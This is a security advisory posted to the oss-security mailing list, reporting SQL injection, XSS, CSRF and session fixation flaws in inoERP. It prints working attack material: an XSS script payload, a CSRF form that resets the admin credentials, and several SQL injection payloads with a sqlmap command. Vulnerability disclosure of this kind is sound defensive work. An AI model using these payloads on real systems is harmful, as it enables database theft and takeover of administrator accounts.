  oss-security - inoERP - Multiple Issues            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 27 Mar From: FOXMOLE Advisories <advisories@...mole.com> To: oss-security@...ts.openwall.com Subject: inoERP - Multiple Issues  -----BEGIN PGP SIGNED MESSAGE----- Hash:  === FOXMOLE - Security Advisory ===  inoERP  - Multiple Issues ~~~~~~~~~~~~~~~~~~~~~~~~~  Affected Versions ================= inoERP  Issue Overview ============== Vulnerability Type: SQL Injection, Cross Site Scripting, Cross Site Request Forgery, Session Fixation Technical Risk: critical Likelihood of Exploitation: medium Vendor: inoERP Vendor URL: http://inoideas.org/  /  https://github.com/inoerp/inoERP Credits: FOXMOLE employee Tim Herres Advisory URL: Advisory Status: Public OVE-ID: CVSS 2.0: (AV:N/AC:L/Au:N/C:C/I:C/A:C)   Impact ====== There are multiple SQL Injection vulnerabilities, exploitable without authentication. An attacker could use the SQL Injection to access the database in an unsafe way. This means there is a high impact to all applications. The inoERP software also lacks in input validation resulting in different reflected/stored XSS vulnerabilities.   Issue Description ================= The following findings are only examples, there are quite more. The whole application should be reviewed.  All items tested using FF52.  1.) Cross Site Scripting: Stored: Create a new Question in the -->Forum --> Ask a question Vulnerable fields : Title, Content Used Payload: Test<script>alert("xss")</script>  Response: [...]  <title>Test<script>alert("xss")</script> - inoERP!</title> [...]  The latest questions are included in the start page which means the entered payload gets executed directly in the start page.  Reflected: With Auth: %3C/scRipt%3E  Unauthenticated:  2.) No protection against Cross Site Request Forgery Attacks: PoC: Changing the admin user credentials.  <html> <body>     <form action="http://<IP>/inoerp/form.php?class_name=user" method="POST">       <input type="hidden" />       <input type="hidden" value="1" />       <input type="hidden" />       <input type="hidden" value="inoerp" />       <input type="hidden" />       <input type="hidden" value="test" />       <input type="hidden" />       <input type="hidden" value="test" />       <input type="hidden" />       <input type="hidden" value="inoerp" />       <input type="hidden" />       <input type="hidden" value="inoerp" />       <input type="hidden" />       <input type="hidden" />       <input type="hidden" /> [..snipped...]  If a privileged user activates the request, the admin user id=1 is set to "test".  3.) SQL Injection: Auth required:No ##### Parameter: module_code (GET)     Type: boolean-based blind     Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause     Payload: module_code=test' RLIKE (SELECT (CASE WHEN THEN ELSE END))-- qkmO      Type: error-based     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)     Payload: module_code=test' AND (SELECT FROM(SELECT FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NPEq      Type: stacked queries     Title: MySQL > stacked queries (comment)     Payload: module_code=test';SELECT SLEEP(5)#      Type: AND/OR time-based blind     Title: MySQL >= OR time-based blind     Payload: module_code=test' OR SLEEP(5)-- STgC  Exploitable using e.g. SQLMAP  Blind SQL Injection: sqlmap -u  -p "content_type%5b%5d" --dbms="MySQL" Parameter: content_type[] (GET)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause     Payload: OR AND 'eanR'='eanR&search_text=3&search_document_list[]=all      Type: AND/OR time-based blind     Title: MySQL >= OR time-based blind     Payload: content_type[]=test' OR SLEEP(5) AND 'exIO'='exIO&search_text=3&search_document_list[]=all #####  4.) Session Fixation: After a successful login the SessionID PHPSESSID remains the same: Before Login: After Login:     Temporary Workaround and Fix ============================ FOXMOLE advises to restrict the access to all vulnerable inoERP systems until all vulnerabilities are fixed.    History =======  Issue discovered  Vendor contacted -> no response  Vendor contacted again -> no response  Vendor contacted again -> no response  Advisory Release   GPG Signature ============= This advisory is signed with the GPG key of the FOXMOLE advisories team. The key can be downloaded here:  -----BEGIN PGP SIGNATURE-----  iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAljYxwAACgkQOBIJIZnj =h4Qx -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      